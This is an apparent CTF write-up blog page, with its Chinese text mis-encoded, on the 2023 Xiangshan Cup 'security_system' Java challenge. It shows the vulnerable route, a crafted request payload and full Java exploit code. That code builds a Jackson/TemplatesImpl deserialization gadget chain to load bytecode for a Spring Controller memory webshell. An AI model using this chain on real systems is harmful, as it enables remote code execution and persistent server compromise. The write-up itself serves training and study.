<html>
  <head>
    <meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>[2023é¦™å±±æ¯å†³èµ›]security_system | skkyblu3</title>
<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
<link rel="alternate" type="application/atom+xml" title="[2023é¦™å±±æ¯å†³èµ›]security_system | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">



    <meta name="description" content="é¢˜ç›®ç¯å¢ƒ
æ„Ÿè°¢å¤§å¤´å“¥å¤ç°çš„ç¯å¢ƒğŸ™ï¼š[CTFå¤ç°è®¡åˆ’]2023é¦™å±±æ¯å†³èµ› security system
é¢˜ç›®åˆ†æ
åç¼–è¯‘jaråŒ…ï¼Œå†…å®¹ç»“æ„å¾ˆç®€å•ï¼Œå°±ä¸€ä¸ª/safeobjectè·¯ç”±ã€‚
@RequestMapping({&quot;/safe..." />
    <meta name="keywords" content="å†…å­˜é©¬,Javaååºåˆ—åŒ–,CTF" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
  </head>
  <body>
    <div class="main">
      <div class="main-content">
        <div class="site-header">
  <a href="https://skyblu3519.github.io">
  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
  </a>
  <h1 class="site-title">
    skkyblu3
  </h1>
  <p class="site-description">
    Welcome to Internet
  </p>
  <div class="menu-container">
    
      
        <a href="/" class="menu">
          é¦–é¡µ
        </a>
      
    
      
        <a href="/archives" class="menu">
          å½’æ¡£
        </a>
      
    
      
        <a href="/tags" class="menu">
          æ ‡ç­¾
        </a>
      
    
      
        <a href="/post/about" class="menu">
          å…³äº
        </a>
      
    
  </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
</div>

        <div class="post-detail">
          <article class="post">
            <h2 class="post-title">
              [2023é¦™å±±æ¯å†³èµ›]security_system
            </h2>
            <div class="post-info">
              <span>
                2023-12-31
              </span>
              <span>
                6 min read
              </span>
              
                <a href="https://skyblu3519.github.io/tag/37Irvvniz/" class="post-tag">
                  # å†…å­˜é©¬
                </a>
              
                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
                  # Javaååºåˆ—åŒ–
                </a>
              
                <a href="https://skyblu3519.github.io/tag/b7GKYdjmj/" class="post-tag">
                  # CTF
                </a>
              
            </div>
            
              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/2023-xiang-shan-bei-jue-sai-security_system.jpg" alt="">
            
            <div class="post-content-wrapper">
              <div class="post-content" v-pre>
                <h1 id="é¢˜ç›®ç¯å¢ƒ">é¢˜ç›®ç¯å¢ƒ</h1>
<p>æ„Ÿè°¢å¤§å¤´å“¥å¤ç°çš„ç¯å¢ƒğŸ™ï¼š<a href="https://mp.weixin.qq.com/s/nlTfCG6-9JAUT1ESMdH3Zg">[CTFå¤ç°è®¡åˆ’]2023é¦™å±±æ¯å†³èµ› security system</a></p>
<h1 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h1>
<p>åç¼–è¯‘jaråŒ…ï¼Œå†…å®¹ç»“æ„å¾ˆç®€å•ï¼Œå°±ä¸€ä¸ª<code>/safeobject</code>è·¯ç”±ã€‚</p>
<pre><code class="language-java">@RequestMapping({&quot;/safeobject&quot;})
public String start(String obj, String classes) throws Exception {
    if (!classes.contains(&quot;Object&quot;) &amp;&amp; !classes.contains(&quot;LinkedHashMap&quot;)) {
        Class c = Class.forName(classes);
        SecurityCheck var10000 = isSafe;
        if (SecurityCheck.isSafe()) {
            Object o = SecurityCheck.deObject(mapper.readValue(obj, c));
            return o.toString();
        } else {
            StringBuilder sb = new StringBuilder();
            var10000 = isSafe;
            Iterator var5 = SecurityCheck.ismap().iterator();

            while(var5.hasNext()) {
                Object item = var5.next();
                byte[] s = SecurityCheck.base64Decode((String)item);
                sb.append(SecurityCheck.deserialize(s));
            }

            return sb.toString();
        }
    } else {
        return &quot;error&quot;;
    }
}
</code></pre>
<p>æ ¹æ®<code>mapper.readValue(obj, c)</code>çš„æ³¨é‡ŠçŒœæµ‹ï¼Œè¿™æ˜¯ä¸€ä¸ªè§£æJsonå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¼¼ä¹æ˜¯è¦è½¬æ¢çš„ç±»å‹ã€‚æ ¹æ®åé¢çš„æµç¨‹ï¼Œè¿™é‡Œåº”è¯¥æ˜¯è¦å°†Jsonè½¬ä¸ºä¸€ä¸ªmapç±»å‹çš„å¯¹è±¡ã€‚</p>
<p><code>SecurityCheck.deObject</code>æ“ä½œçš„æ˜¯<code>mapper.readValue(obj, c)</code>è§£æå‡ºçš„mapï¼Œå®ƒä¼šå°†mapä¸­<code>@type</code>æ‰€æŒ‡çš„ç±»å®ä¾‹åŒ–æˆä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åç”¨mapå‰©ä¸‹çš„é”®å€¼å¯¹æ¥ä¿®æ”¹è¿™ä¸ªå¯¹è±¡çš„å±æ€§ï¼Œæœ€åè¿”å›è¿™ä¸ªå¯¹è±¡ã€‚</p>
<pre><code class="language-java">public static Object deObject(Object ob) throws Exception {
    if (ob instanceof LinkedHashMap) {
        LinkedHashMap map = (LinkedHashMap)ob;
        String type = (String)map.get(&quot;@type&quot;);
        if (!&quot;&quot;.equals(type) &amp;&amp; type != null) {
            Class clazz = Class.forName(type);
            Object obj = clazz.newInstance();
            Iterator ir = map.keySet().iterator();

            while(ir.hasNext()) {
                String key = (String)ir.next();
                Object value = map.get(key);
                if (!key.equals(&quot;@type&quot;)) {
                    Field field = getField(clazz, key);
                    if (field != null) {
                        setFieldValues(obj, key, value);
                    }
                }
            }

            return obj;
        } else {
            return map;
        }
    } else {
        return ob;
    }
}
</code></pre>
<p>ï¿½<br>
æ³¨æ„åˆ°è¿™ä¸ªè¿”å›çš„å¯¹è±¡åœ¨<code>start</code>ä¸­ä¼šç›´æ¥è°ƒç”¨å®ƒçš„<code>toString</code>æ–¹æ³•ï¼Œè¿™é‡Œä¼¼ä¹å¯ä»¥ç›´æ¥è¡”æ¥åˆ°JackSonååºåˆ—åŒ–çš„<code>POJONode</code>ã€‚ä½†è¿™é‡Œåœ¨å®ä¾‹åŒ–<code>clazz</code>çš„æ—¶å€™è°ƒç”¨çš„æ˜¯å®ƒçš„æ— å‚æ„é€ æ–¹æ³•ï¼Œè€Œ<code>POJONode</code>åªæœ‰æœ‰å‚çš„ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¼šåœ¨å®ä¾‹åŒ–<code>POJONode</code>çš„æ—¶å€™å¤±è´¥ã€‚</p>
<p>è¿™é‡Œè¦ç”¨elseçš„éƒ¨åˆ†æ‰“ï¼Œ<code>SecurityCheck.deObject()</code>ä¹Ÿå¯ä»¥ä¿®æ”¹<code>SecurityCheck</code>ä¸­çš„é™æ€å˜é‡ã€‚æ‰€ä»¥æ€è·¯å°±å¾ˆæ˜ç¡®äº†</p>
<ul>
<li>ç¬¬ä¸€æ¬¡è¯·æ±‚åœ¨ if éƒ¨åˆ†ä¿®æ”¹<code>SecurityCheck</code>çš„<code>safe</code>ä¸º<code>false</code>ï¼Œ<code>treeMap</code>åŒ…å«æ¶æ„çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ã€‚</li>
<li>ç¬¬äºŒæ¬¡è¯·æ±‚åœ¨ else éƒ¨åˆ†å°†<code>treeMap</code>ä¸­çš„å†…å®¹å–å‡ºè§¦å‘ååºåˆ—åŒ–ã€‚</li>
</ul>
<h1 id="è§£é¢˜æµç¨‹">è§£é¢˜æµç¨‹</h1>
<p>å› ä¸ºclassesä¸èƒ½ä¸ºLinkedHashMapï¼Œæ‰€ä»¥é€‰å–ä¸€ä¸ªLinkedHashMapçš„å­ç±»ï¼Œè¿™é‡Œé€‰æ‹©çš„æ˜¯<code>org.springframework.ui.ModelMap</code></p>
<p>ç„¶åæ˜¯<code>obj</code>çš„æ„é€ ï¼Œå”¯ä¸€è¦æ€è€ƒçš„å°±æ˜¯ç”¨æ¥æ›¿æ¢<code>treeMap</code>çš„å€¼æ€ä¹ˆå†™ã€‚è™½ç„¶JSONç”¨æ¥è¡¨ç¤ºSetçš„å†™æ³•æ˜¯<code>[&quot;content&quot;]</code>ï¼Œä½†æ˜¯è¿™é‡Œåªèƒ½è¢«è§£æä¸ºArrayListï¼Œæ— æ³•è¢«æ›¿æ¢ã€‚</p>
<p>æ³¨æ„åˆ°è¿™é‡Œçš„<code>setFieldValues</code>çš„å†™æ³•æ˜¯</p>
<pre><code class="language-java">public static void setFieldValues(Object obj, String fieldName, Object fieldValue) {
    try {
        setFieldValue(obj, fieldName, deObject(fieldValue));
    } catch (Exception var4) {
        System.out.println(var4);
    }

}
</code></pre>
<p>è¿™é‡Œå¯¹ä¿®æ”¹çš„fieldValueåˆè°ƒç”¨äº†ä¸€æ¬¡<code>deObject</code>ï¼Œæœ‰ä¸€ç‚¹ç»•ï¼Œä¸è¿‡è¿™æ ·è®©æˆ‘ä»¬å¯ä»¥ç›´æ¥å®ä¾‹åŒ–ä¸€ä¸ªHashSetæ¥æ›¿æ¢ã€‚å¦å¤–ï¼Œç®€å•è®°ä¸€ä¸‹Setä¸­å­˜å‚¨å€¼çš„æ˜¯ä¸€ä¸ªmapçš„Keyï¼Œvalueå¯ä»¥ä¸ç”¨ç®¡ï¼ˆæ„Ÿè§‰ä¹‹å‰CCé“¾å¥½åƒè§è¿‡...ï¼‰<br>
<img src="https://skyblu3519.github.io/post-images/1703959074081.png" alt="" loading="lazy"></p>
<p>æ‰€ä»¥payloadæ„é€ ä¸º</p>
<pre><code>obj={&quot;@type&quot;:&quot;com.example.jackson.SecurityCheck&quot;,&quot;treeMap&quot;:{&quot;@type&quot;:&quot;java.util.HashSet&quot;,&quot;map&quot;:{&quot;ååºåˆ—åŒ–çš„å­—ç¬¦ä¸²&quot;:&quot;&quot;}},&quot;safe&quot;:false}&amp;classes=org.springframework.ui.ModelMap
</code></pre>
<p>ååºåˆ—åŒ–çš„é“¾å­é€‰æ‹©JackSoné‚£æ¡ï¼ˆç¨³å®šç‰ˆï¼‰ï¼Œç”¨å®ƒæ¥æ‰“ä¸€ä¸ªåˆšå­¦åˆ°çš„Controllerå†…å­˜é©¬</p>
<pre><code class="language-java">package yso.json.Jackson;

import com.fasterxml.jackson.databind.node.POJONode;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.commons.codec.binary.Base64;
import org.springframework.aop.framework.AdvisedSupport;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Exp {
    public static void main(String[] args) throws Exception{
        byte[] bytecode = Files.readAllBytes(Paths.get(&quot;./target/classes/SpControllerExploit2.class&quot;));       // Evil bytecode
        byte[][] bytecodes = {bytecode};
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setValue(templates, &quot;_bytecodes&quot;, bytecodes);
        setValue(templates, &quot;_name&quot;, &quot;xx&quot;);
        setValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());

        // ä½¿ç”¨JdkDynamicAopProxyç¨³å®šè°ƒç”¨
        Class&lt;?&gt; clazz = Class.forName(&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;);
        Constructor&lt;?&gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class);
        cons.setAccessible(true);
        AdvisedSupport advisedSupport = new AdvisedSupport();
        advisedSupport.setTarget(templates);
        InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport);
        Object proxyObj = Proxy.newProxyInstance(clazz.getClassLoader(), new Class[]{Templates.class}, handler);

        // åˆ é™¤ jsonNode çš„ writeReplace
        try {
            ClassPool _pool = ClassPool.getDefault();
            CtClass jsonNode = _pool.get(&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;);
            CtMethod writeReplace = jsonNode.getDeclaredMethod(&quot;writeReplace&quot;);
            jsonNode.removeMethod(writeReplace);
            ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
            jsonNode.toClass(classLoader, null);
        } catch (Exception e) {
        }

        POJONode node = new POJONode(proxyObj);
        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        Field valfield = val.getClass().getDeclaredField(&quot;val&quot;);
        valfield.setAccessible(true);
        valfield.set(val, node);

        String s = serializeToBase64(val);
        System.out.println(s);
//        deserializeFromBase64(s);
    }
    public static void setValue(Object instance, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Field field = instance.getClass().getDeclaredField(fieldName); // è·å–ç§æœ‰å­—æ®µ
        field.setAccessible(true);  // è®¾ç½®ä¸ºå¯è®¿é—®
        field.set(instance, value); // ä¸ºå­—æ®µè®¾ç½®æ–°å€¼
    }
    public static Object deserializeFromBase64(String base64String) throws IOException, ClassNotFoundException {
//        byte[] data = Base64.getDecoder().decode(base64String);
        byte[] data = Base64.decodeBase64(base64String);
        try (ByteArrayInputStream bais = new ByteArrayInputStream(data);
             ObjectInputStream ois = new ObjectInputStream(bais)) {

            return ois.readObject();
        }
    }

    public static String serializeToBase64(Object obj) throws IOException {
        try (ByteArrayOutputStream baos = new ByteArrayOutputStream();
             ObjectOutputStream oos = new ObjectOutputStream(baos)) {

            oos.writeObject(obj);
            oos.flush();

//            return Base64.getEncoder().encodeToString(baos.toByteArray());
            return org.apache.commons.codec.binary.Base64.encodeBase64String(baos.toByteArray());
        }
    }
}
</code></pre>
<p>è¯»å–flag~<br>
<img src="https://skyblu3519.github.io/post-images/1703959089265.png" alt="" loading="lazy"></p>
<h1 id="ä¿®å¤">ä¿®å¤</h1>
<p>è¿‡æ»¤ä¸€ä¸‹@type</p>

              </div>
              <div class="toc-container">
                <ul class="markdownIt-TOC">
<li><a href="#%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83">é¢˜ç›®ç¯å¢ƒ</a></li>
<li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">é¢˜ç›®åˆ†æ</a></li>
<li><a href="#%E8%A7%A3%E9%A2%98%E6%B5%81%E7%A8%8B">è§£é¢˜æµç¨‹</a></li>
<li><a href="#%E4%BF%AE%E5%A4%8D">ä¿®å¤</a></li>
</ul>

              </div>
            </div>
          </article>
        </div>

        
          <div class="next-post">
            <div class="next">ä¸‹ä¸€ç¯‡</div>
            <a href="https://skyblu3519.github.io/post/spring-controllerinterceptor-nei-cun-ma/">
              <h3 class="post-title">
                Spring Controller/Interceptor å†…å­˜é©¬
              </h3>
            </a>
          </div>
        

        

        <div class="site-footer">
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
    <i class="ri-rss-line"></i> RSS
  </a>
</div>

      </div>
    </div>

    <script>
      hljs.initHighlightingOnLoad()

      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");

      // This should probably be throttled.
      // Especially because it triggers during smooth scrolling.
      // https://lodash.com/docs/4.17.10#throttle
      // You could do like...
      // window.addEventListener("scroll", () => {
      //    _.throttle(doThatStuff, 100);
      // });
      // Only not doing it here to keep this Pen dependency-free.

      window.addEventListener("scroll", event => {
        let fromTop = window.scrollY;

        mainNavLinks.forEach((link, index) => {
          let section = document.getElementById(decodeURI(link.hash).substring(1));
          let nextSection = null
          if (mainNavLinks[index + 1]) {
            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
          }
          if (section.offsetTop <= fromTop) {
            if (nextSection) {
              if (nextSection.offsetTop > fromTop) {
                link.classList.add("current");
              } else {
                link.classList.remove("current");    
              }
            } else {
              link.classList.add("current");
            }
          } else {
            link.classList.remove("current");
          }
        });
      });

    </script>
  </body>
</html>
